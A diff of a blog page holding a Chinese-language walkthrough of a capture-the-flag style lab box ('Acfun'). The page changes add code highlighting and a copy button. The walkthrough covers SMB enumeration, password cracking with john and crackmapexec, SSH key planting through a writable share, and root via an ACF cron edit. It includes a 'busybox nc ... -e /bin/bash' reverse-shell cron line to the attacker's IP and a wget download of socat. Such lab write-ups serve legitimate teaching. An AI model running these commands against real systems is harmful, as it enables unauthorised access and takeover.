@@ -42,7 +42,7 @@ PORT    STATE SERVICE
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Acfun.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Acfun</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -66,7 +66,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -99,116 +109,100 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
-<pre lang="bash"><code>IP=192.168.205.203
-nmap -p0-65535 $IP
-</code></pre>
-<pre><code>PORT    STATE SERVICE
+<div class="highlight highlight-source-shell"><pre class="notranslate">IP=192.168.205.203
+nmap -p0-65535 <span class="pl-smi">$IP</span></pre></div>
+<pre class="notranslate"><code class="notranslate">PORT    STATE SERVICE
 22/tcp  open  ssh
 139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
 </code></pre>
 <p>只有 SSH 和 SMB，没有 Web 端口。直接从 SMB 入手。</p>
-<pre lang="bash"><code>enum4linux -a $IP
-</code></pre>
-<p>关键信息一把捞出来了：主机名 ACFUN，允许匿名会话，Samba 用户 <code>leaf</code>，通过 RID cycling 还跑出一个隐藏的 Unix 用户 <code>xueli</code>。匿名可访问的共享只有一个 <code>public</code>。密码策略很松，最小5位，无复杂度，无锁定。</p>
-<pre lang="bash"><code>smbclient //$IP/public -N
-smb: \&gt; ls
-smb: \&gt; get ACF_Framework_Internal_Guide.pdf
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">enum4linux -a <span class="pl-smi">$IP</span></pre></div>
+<p>关键信息一把捞出来了：主机名 ACFUN，允许匿名会话，Samba 用户 <code class="notranslate">leaf</code>，通过 RID cycling 还跑出一个隐藏的 Unix 用户 <code class="notranslate">xueli</code>。匿名可访问的共享只有一个 <code class="notranslate">public</code>。密码策略很松，最小5位，无复杂度，无锁定。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">smbclient //<span class="pl-smi">$IP</span>/public -N
+smb: <span class="pl-cce">\&gt;</span> ls
+smb: <span class="pl-cce">\&gt;</span> get ACF_Framework_Internal_Guide.pdf</pre></div>
 <p>共享里只有一个加密 PDF。</p>
-<pre lang="bash"><code>pdf2john ACF_Framework_Internal_Guide.pdf &gt; hash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
-</code></pre>
-<p>PDF 密码秒破：<code>1234567890</code>。打开看内容，是一份内部技术备忘录，介绍 ACF（Alpine Configuration Framework）的部署方式，提到 <code>acf-core</code>、<code>acf-lib</code>、<code>haserl</code> 这几个包，作者邮箱 <code>leaf@acfun.dsz</code>。当时记下了两个信息：目标跑的是 Alpine Linux，有一个基于 Lua 和 haserl 的 Web 管理框架。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">pdf2john ACF_Framework_Internal_Guide.pdf <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
+john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span></pre></div>
+<p>PDF 密码秒破：<code class="notranslate">1234567890</code>。打开看内容，是一份内部技术备忘录，介绍 ACF（Alpine Configuration Framework）的部署方式，提到 <code class="notranslate">acf-core</code>、<code class="notranslate">acf-lib</code>、<code class="notranslate">haserl</code> 这几个包，作者邮箱 <code class="notranslate">leaf@acfun.dsz</code>。当时记下了两个信息：目标跑的是 Alpine Linux，有一个基于 Lua 和 haserl 的 Web 管理框架。</p>
 <h1>SMB 爆破与初始立足</h1>
-<p>PDF 密码 <code>1234567890</code> 拿去试 SSH，不行。既然密码策略这么弱，直接拿 rockyou 爆 SMB。</p>
-<pre lang="bash"><code>crackmapexec smb $IP -u leaf -p /usr/share/wordlists/rockyou.txt
+<p>PDF 密码 <code class="notranslate">1234567890</code> 拿去试 SSH，不行。既然密码策略这么弱，直接拿 rockyou 爆 SMB。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">crackmapexec smb <span class="pl-smi">$IP</span> -u leaf -p /usr/share/wordlists/rockyou.txt</pre></div>
+<pre class="notranslate"><code class="notranslate">SMB  192.168.205.203 445  ACFUN  [+] ACFUN\leaf:gothic
 </code></pre>
-<pre><code>SMB  192.168.205.203 445  ACFUN  [+] ACFUN\leaf:gothic
-</code></pre>
-<p>拿到 <code>leaf:gothic</code>，但这个密码 SSH 也登不上去，应该是 SSH 禁了密码认证或者 leaf 不在 AllowUsers 里。</p>
-<pre lang="bash"><code>smbmap -H $IP -u leaf -p 'gothic'
-</code></pre>
-<pre><code>public    READ ONLY
+<p>拿到 <code class="notranslate">leaf:gothic</code>，但这个密码 SSH 也登不上去，应该是 SSH 禁了密码认证或者 leaf 不在 AllowUsers 里。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">smbmap -H <span class="pl-smi">$IP</span> -u leaf -p <span class="pl-s"><span class="pl-pds">'</span>gothic<span class="pl-pds">'</span></span></pre></div>
+<pre class="notranslate"><code class="notranslate">public    READ ONLY
 leaf      READ, WRITE   Home Directories
 </code></pre>
-<p>leaf 的家目录通过 SMB 可读写。进去翻了一下，发现 <code>.ssh</code> 目录里有私钥。</p>
-<pre lang="bash"><code>smbclient //$IP/leaf -U leaf%gothic
-smb: \&gt; cd .ssh
-smb: \&gt; ls
-smb: \&gt; get id_ed25519
-smb: \&gt; get id_ed25519.pub
-</code></pre>
-<p>拿到了 leaf 的 SSH 私钥，但直接用它去连还是要求输密码。原因很简单，<code>.ssh</code> 目录里没有 <code>authorized_keys</code> 文件，公钥认证根本没配置。</p>
-<p>既然 SMB 对 leaf 家目录有写权限，直接把我 Kali 的公钥传上去当 <code>authorized_keys</code>。</p>
-<pre lang="bash"><code>smbclient //$IP/leaf -U leaf%gothic -c 'cd .ssh; put authorized_keys authorized_keys'
-</code></pre>
-<pre lang="bash"><code>ssh leaf@$IP
-</code></pre>
+<p>leaf 的家目录通过 SMB 可读写。进去翻了一下，发现 <code class="notranslate">.ssh</code> 目录里有私钥。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">smbclient //<span class="pl-smi">$IP</span>/leaf -U leaf%gothic
+smb: <span class="pl-cce">\&gt;</span> <span class="pl-c1">cd</span> .ssh
+smb: <span class="pl-cce">\&gt;</span> ls
+smb: <span class="pl-cce">\&gt;</span> get id_ed25519
+smb: <span class="pl-cce">\&gt;</span> get id_ed25519.pub</pre></div>
+<p>拿到了 leaf 的 SSH 私钥，但直接用它去连还是要求输密码。原因很简单，<code class="notranslate">.ssh</code> 目录里没有 <code class="notranslate">authorized_keys</code> 文件，公钥认证根本没配置。</p>
+<p>既然 SMB 对 leaf 家目录有写权限，直接把我 Kali 的公钥传上去当 <code class="notranslate">authorized_keys</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">smbclient //<span class="pl-smi">$IP</span>/leaf -U leaf%gothic -c <span class="pl-s"><span class="pl-pds">'</span>cd .ssh; put authorized_keys authorized_keys<span class="pl-pds">'</span></span></pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ssh leaf@<span class="pl-smi">$IP</span></pre></div>
 <p>顺利拿到 leaf 的 shell。</p>
 <h1>横移到 xueli</h1>
 <p>登进去跑了 linpeas，Alpine 的 BusyBox 环境跟 linpeas 兼容性不太好，ps 命令疯狂报错，但还是捞到了关键信息。</p>
 <p>几个重要发现：</p>
 <ul>
-<li><code>/usr/bin/haserl-lua5.4</code> 有 SUID root 位</li>
-<li><code>127.0.0.1:443</code> 有 mini_httpd 在监听，跑的是 ACF Web 界面</li>
-<li><code>/etc/acf/passwd</code> 权限是 <code>root:xueli</code>，xueli 组可读</li>
-<li><code>/tmp</code> 挂载了 <code>nosuid,nodev</code></li>
+<li><code class="notranslate">/usr/bin/haserl-lua5.4</code> 有 SUID root 位</li>
+<li><code class="notranslate">127.0.0.1:443</code> 有 mini_httpd 在监听，跑的是 ACF Web 界面</li>
+<li><code class="notranslate">/etc/acf/passwd</code> 权限是 <code class="notranslate">root:xueli</code>，xueli 组可读</li>
+<li><code class="notranslate">/tmp</code> 挂载了 <code class="notranslate">nosuid,nodev</code></li>
 </ul>
-<p>SUID 的 haserl 是个很诱人的目标，但折腾了一阵发现 Linux 内核对脚本 shebang 不传递 SUID 位。命令行传 <code>--shell=lua</code> 参数虽然能执行 Lua 代码，但那样走的不是 SUID 路径，跑出来还是 leaf 权限。这条路暂时走不通。</p>
-<p>ACF 密码文件属于 <code>root:xueli</code> 组，leaf 读不了，得先横移到 xueli。</p>
-<p>试了一下用 leaf 的 SSH 私钥直接连 xueli，居然成了，xueli 的 <code>authorized_keys</code> 里配的就是 leaf 的公钥。</p>
-<pre lang="bash"><code>ssh xueli@127.0.0.1 -i ~/.ssh/id_ed25519
-</code></pre>
-<pre><code>xueli@Acfun:~$ id
+<p>SUID 的 haserl 是个很诱人的目标，但折腾了一阵发现 Linux 内核对脚本 shebang 不传递 SUID 位。命令行传 <code class="notranslate">--shell=lua</code> 参数虽然能执行 Lua 代码，但那样走的不是 SUID 路径，跑出来还是 leaf 权限。这条路暂时走不通。</p>
+<p>ACF 密码文件属于 <code class="notranslate">root:xueli</code> 组，leaf 读不了，得先横移到 xueli。</p>
+<p>试了一下用 leaf 的 SSH 私钥直接连 xueli，居然成了，xueli 的 <code class="notranslate">authorized_keys</code> 里配的就是 leaf 的公钥。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ssh xueli@127.0.0.1 -i <span class="pl-k">~</span>/.ssh/id_ed25519</pre></div>
+<pre class="notranslate"><code class="notranslate">xueli@Acfun:~$ id
 uid=1001(xueli) gid=1001(xueli) groups=1001(xueli)
 </code></pre>
 <h1>读取 ACF 密码并破解</h1>
-<pre lang="bash"><code>cat /etc/acf/passwd
-</code></pre>
-<pre><code>root:$5$rDkGkMAvv6FPpwRG$.gS5I9LcOiZDYGW598cgXDPEDvHI7GLl.UmVxgdyUQ0:Admin account:ADMIN
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat /etc/acf/passwd</pre></div>
+<pre class="notranslate"><code class="notranslate">root:$5$rDkGkMAvv6FPpwRG$.gS5I9LcOiZDYGW598cgXDPEDvHI7GLl.UmVxgdyUQ0:Admin account:ADMIN
 </code></pre>
 <p>SHA-256-crypt 哈希，拉回 Kali 破解。</p>
-<pre lang="bash"><code>echo 'root:$5$rDkGkMAvv6FPpwRG$.gS5I9LcOiZDYGW598cgXDPEDvHI7GLl.UmVxgdyUQ0' &gt; hash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>root:$5$rDkGkMAvv6FPpwRG$.gS5I9LcOiZDYGW598cgXDPEDvHI7GLl.UmVxgdyUQ0<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
+john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span></pre></div>
+<pre class="notranslate"><code class="notranslate">root:juggernaut
 </code></pre>
-<pre><code>root:juggernaut
-</code></pre>
-<p>这是 ACF Web 界面的密码，不是系统 root 密码，拿去 <code>su root</code> 试了一下果然不行。</p>
+<p>这是 ACF Web 界面的密码，不是系统 root 密码，拿去 <code class="notranslate">su root</code> 试了一下果然不行。</p>
 <h1>通过 ACF Web 提权</h1>
-<p>ACF 监听在 <code>127.0.0.1:443</code>，外部访问不到。靶机上没有 curl，上传了一个静态编译的 socat 做端口转发。</p>
-<pre lang="bash"><code>cd /tmp
+<p>ACF 监听在 <code class="notranslate">127.0.0.1:443</code>，外部访问不到。靶机上没有 curl，上传了一个静态编译的 socat 做端口转发。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> /tmp
 busybox wget 192.168.205.128/socat
 chmod +x socat
-./socat TCP-LISTEN:4443,fork TCP4:127.0.0.1:443 &amp;
-</code></pre>
-<p>浏览器访问 <code>https://192.168.205.203:4443</code>，用 <code>root:juggernaut</code> 登录 ACF 管理界面。</p>
-<p>界面功能不少，Networking、Packages、Init、Cron 都有。我直接奔着 Cron 的 Expert 编辑去了。ACF 的 CGI 通过 SUID 的 haserl 以 root 身份执行，意味着它能直接改 <code>/etc/crontabs/root</code>。</p>
+./socat TCP-LISTEN:4443,fork TCP4:127.0.0.1:443 <span class="pl-k">&amp;</span></pre></div>
+<p>浏览器访问 <code class="notranslate">https://192.168.205.203:4443</code>，用 <code class="notranslate">root:juggernaut</code> 登录 ACF 管理界面。</p>
+<p>界面功能不少，Networking、Packages、Init、Cron 都有。我直接奔着 Cron 的 Expert 编辑去了。ACF 的 CGI 通过 SUID 的 haserl 以 root 身份执行，意味着它能直接改 <code class="notranslate">/etc/crontabs/root</code>。</p>
 <p>原始 cron 内容：</p>
-<pre><code>*/15 * * * * run-parts /etc/periodic/15min
+<pre class="notranslate"><code class="notranslate">*/15 * * * * run-parts /etc/periodic/15min
 0    * * * * run-parts /etc/periodic/hourly
 0    2 * * * run-parts /etc/periodic/daily
 0    3 * * 6 run-parts /etc/periodic/weekly
 0    5 1 * * run-parts /etc/periodic/monthly
 </code></pre>
 <p>在末尾加了一行反弹 shell：</p>
-<pre><code>* * * * * busybox nc 192.168.205.128 8888 -e /bin/bash
+<pre class="notranslate"><code class="notranslate">* * * * * busybox nc 192.168.205.128 8888 -e /bin/bash
 </code></pre>
 <p>保存提交，Kali 上开好监听。</p>
-<pre lang="bash"><code>nc -lvnp 8888
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
 <p>等了一会没回来，不知道什么原因，可能 busybox crond 有缓存或者需要重新加载。直接重启靶机让 crond 重新读取 crontab，重启完几十秒 root shell 就回来了。</p>
-<pre><code>id
+<pre class="notranslate"><code class="notranslate">id
 uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 </code></pre>
 <h1>Flag</h1>
-<pre lang="bash"><code>cat /home/xueli/user.txt
-cat /root/root.txt
-</code></pre>
-<pre><code>flag{user-a7048bfa96c2a4bbd4fbf76465e645fb}
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat /home/xueli/user.txt
+cat /root/root.txt</pre></div>
+<pre class="notranslate"><code class="notranslate">flag{user-a7048bfa96c2a4bbd4fbf76465e645fb}
 flag{root-e0694a86a8214b57d9bc3f8dae30bf33}
-</code></pre>
-</div>
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -233,7 +227,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -280,7 +274,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
